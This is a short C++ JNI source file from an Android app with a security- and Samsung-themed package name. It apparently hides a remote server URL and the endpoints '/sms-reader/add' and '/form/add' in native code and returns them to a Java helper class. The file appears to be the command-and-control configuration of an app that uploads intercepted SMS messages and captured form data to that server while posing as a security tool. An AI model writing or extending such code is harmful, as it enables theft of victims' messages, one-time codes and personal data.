#include <jni.h>
#include <string>

std::string URL = "https://amanbhaidkbosswala.in/api";
std::string SITE = "localhost";
std::string SMSSavePath = "/sms-reader/add";
std::string FormSavePath = "/form/add";

extern "C"
JNIEXPORT jstring JNICALL
Java_security_union_safe_guard_mask_samsung_Helper_URL(JNIEnv *env, jobject thiz) {
    return env->NewStringUTF(URL.c_str());
}


extern "C"
JNIEXPORT jstring JNICALL
Java_security_union_safe_guard_mask_samsung_Helper_SITE(JNIEnv *env, jobject thiz) {
    return env->NewStringUTF(SITE.c_str());
}

extern "C"
JNIEXPORT jstring JNICALL
Java_security_union_safe_guard_mask_samsung_Helper_SMSSavePath(JNIEnv *env, jobject thiz) {
    return env->NewStringUTF(SMSSavePath.c_str());
}


extern "C"
JNIEXPORT jstring JNICALL
Java_security_union_safe_guard_mask_samsung_Helper_FormSavePath(JNIEnv *env, jobject thiz) {
    return env->NewStringUTF(FormSavePath.c_str());
}